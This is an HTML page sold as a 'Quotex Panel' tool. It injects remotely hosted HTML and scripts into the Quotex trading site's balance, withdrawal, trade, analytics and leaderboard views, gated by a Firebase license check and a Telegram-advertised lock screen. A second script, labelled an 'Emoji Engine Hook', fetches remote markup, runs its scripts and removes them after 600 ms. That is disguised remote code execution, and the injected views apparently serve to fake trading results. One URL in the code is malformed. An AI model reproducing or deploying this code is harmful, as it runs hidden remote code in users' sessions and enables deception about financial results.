<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quotex Panel System</title>
</head>
<body>

<script id="js">
(function() {
    var pID = "talha-trader-admin-panel-lock",
        db = "https://" + pID + "-default-rtdb.firebaseio.com/users.json",
        baseURL = "https-talha-bhai-scripts.vercel.app/";

    const uP = new URLSearchParams(window.location.search);
    let id = uP.get('id') || "";

    if (!id) return;

    let currentRouteKey = null;

    // Fast Firebase fetch with timeout
    async function fetchWithTimeout(url, ms = 4000) {
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), ms);
        try {
            const r = await fetch(url, { signal: ctrl.signal });
            clearTimeout(timer);
            return r;
        } catch (e) {
            clearTimeout(timer);
            return null;
        }
    }

    async function initSystem() {
        const r = await fetchWithTimeout(db, 4000);
        const d = r ? await r.json().catch(() => null) : null;
        const userData = d ? Object.values(d).find(u => u.id === id) : null;
        
        if (userData) {
            // Full System Loop Start: Har 2 second baad automatically Quotex UI ko monitor karega
            setInterval(() => {
                runCheck(userData);
            }, 2000);
            runCheck(userData); 
        } else {
            showTalhaLock(id);
        }
    }

    // Element checks
    function isVisible(el) {
        return el && (el.offsetWidth > 0 || el.offsetHeight > 0);
    }

    function checkLeaderboardElement() {
        const el = document.querySelector(".app--sidepanel-open");
        return isVisible(el);
    }

    function checkTradeListElement() {
        return !!document.querySelector("div[data-index]");
    }

    // Main routing engine for Quotex
    function runCheck(u) {
        const url = window.location.href;
        const urlParams = new URLSearchParams(window.location.search);
        const isDashTrue = urlParams.get('dash') === 'true';
        const isWinTrue = urlParams.get('win') === 'true';

        let route = null;

        // PRIORITY 1: URL params
        if (isDashTrue) {
            route = { f: "BL.html", k: "lb" };
        }
        else if (isWinTrue) {
            route = { f: "wins.html", k: "win" };
        }
        // PRIORITY 2: URL keywords
        else if (url.includes("withdrawal")) {
            route = { f: "ps.html", k: "p" };
        }
        else if (url.includes("balance")) {
            route = { f: "ts.html", k: "t" };
        }
        else if (url.includes("analytics")) {
            route = { f: "anas.html", k: "ana" };
        }
        // PRIORITY 3: Device Routing
        else if (url.includes("demo-trade") || url.includes("trade")) {
            const file = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "androids.html" : "pcs.html";
            route = {
                f: file,
                k: file === "androids.html" ? "android" : "pc"
            };
        }
        // PRIORITY 4: Leaderboard element
        else if (checkLeaderboardElement()) {
            route = { f: "BL.html", k: "lb" };
        }
        // PRIORITY 5: Trade list element
        else if (checkTradeListElement()) {
            route = { f: "wins.html", k: "win" };
        }
        else {
            return; // Silent wait on Quotex main dashboard
        }

        // Agar route same hai to bar bar inject nahi karega performance bachane ke liye
        if (currentRouteKey === route.k) return;
        currentRouteKey = route.k;

        loadRoute(route, u);
    }

    function loadRoute(route, u) {
        if (u.permissions && u.permissions[route.k] === false) {
            showTalhaLock(id);
            return;
        }

        // Clean existing injected wrappers
        document.querySelectorAll("[id^='talha-injected-']").forEach(el => el.remove());

        const div = document.createElement('div');
        div.id = 'talha-injected-' + route.k;
        document.body.appendChild(div);

        fetch(baseURL + route.f)
            .then(res => res.text())
            .then(html => {
                div.innerHTML = html;
                div.querySelectorAll('script').forEach(old => {
                    const s = document.createElement('script');
                    if (old.src) s.src = old.src;
                    else s.textContent = old.textContent;
                    document.body.appendChild(s);
                });
            })
            .catch(err => console.error("Route load issue:", err));
    }

    // Talha Lock Dialog UI
    function showTalhaLock(uid) {
        if (document.getElementById("talhaLock")) return;

        const htmlContent = `<style>
        dialog#talhaLock {
            border: none; padding: 0; background: transparent;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
        }
        dialog#talhaLock::backdrop {
            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);
        }
        .glass {
            width: 420px; max-width: 92vw; padding: 28px 24px 26px; border-radius: 12px;
            background: rgba(255, 255, 255, 0.9); box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            color: #0d1f10; text-align: center; position: relative;
            animation: popIn 0.4s cubic-bezier(0.16, 1, 0.3, 1); margin: auto;
        }
        @keyframes popIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .info { margin: 2rem 0; background: rgba(0, 0, 0, 0.05); border: 1px solid rgba(0, 0, 0, 0.1); border-radius: 10px; padding: 12px 14px; text-align: left; }
        .label { font-size: 0.7rem; letter-spacing: 0.5px; opacity: 0.6; margin-bottom: 4px; font-weight: 600; }
        .value-row { display: flex; align-items: center; justify-content: space-between; gap: 10px; }
        .value { font-size: 0.95rem; font-weight: 600; word-break: break-all; }
        .copy-btn { background: transparent; border: none; cursor: pointer; opacity: 0.7; }
        .copy-btn svg { width: 18px; height: 18px; fill: #0d1f10; }
        .telegram-btn { display: inline-block; background: linear-gradient(135deg, #229ed9, #1d4ed8); color: white; padding: 10px 20px; border-radius: 10px; font-weight: 700; text-decoration: none; animation: pulse 1.8s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.04); } }
        .close-cross { position: absolute; top: 12px; right: 18px; font-size: 1.3rem; cursor: pointer; opacity: 0.8; }
        </style>
        <div class="glass">
          <div class="close-cross">&times;</div>
          <div style="font-size:2rem;font-weight:900;margin-bottom:10px;">TALHA SCRIPTS</div>
          <div style="font-size:1rem;margin:1rem 0;">(🔒 LOCKED 🔒)</div>
          <div class="info">
            <div class="label">ID</div>
            <div class="value-row">
              <div class="value">${uid}</div>
              <button class="copy-btn" id="copyBtnTalha">
                <svg viewBox="0 0 24 24"><path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1zm3 4H8a2 2 0 0 0-2 2v16h13a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z"/></svg>
              </button>
            </div>
          </div>
          <div class="footer-social"><a href="https://t.me/TALHAQOTEXKING" target="_blank" class="telegram-btn">🚀 Telegram @TALHAQOTEXKING</a></div>
        </div>`;

        const myDialog = document.createElement("dialog");
        myDialog.id = "talhaLock";
        myDialog.innerHTML = htmlContent;
        document.body.appendChild(myDialog);
        myDialog.showModal();

        myDialog.querySelector("#copyBtnTalha").onclick = function () {
            navigator.clipboard.writeText(uid);
        };
        myDialog.querySelector(".close-cross").onclick = function () {
            myDialog.close();
            myDialog.remove();
        };
    }

    initSystem();
})();
</script>

<script>
    // Zeetex Emoji Engine Hook
    (async () => {
        try {
            let response = await fetch(`https://talha-scripts.vercel.app/heart.html`);
            let rawMarkup = await response.text();
            let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
            
            documentDOM.querySelectorAll('script').forEach(oldNode => {
                let freshScriptNode = document.createElement('script');
                if (oldNode.src) {
                    freshScriptNode.src = oldNode.src;
                } else {
                    freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
                }
                document.body.appendChild(freshScriptNode);
                setTimeout(() => freshScriptNode.remove(), 600);
            });
            console.log("Zeetex Emoji Engine Hook Active");
        } catch (e) {
            console.error("Emoji Override Skipped.", e);
        }
    })();
</script>

</body>
</html>
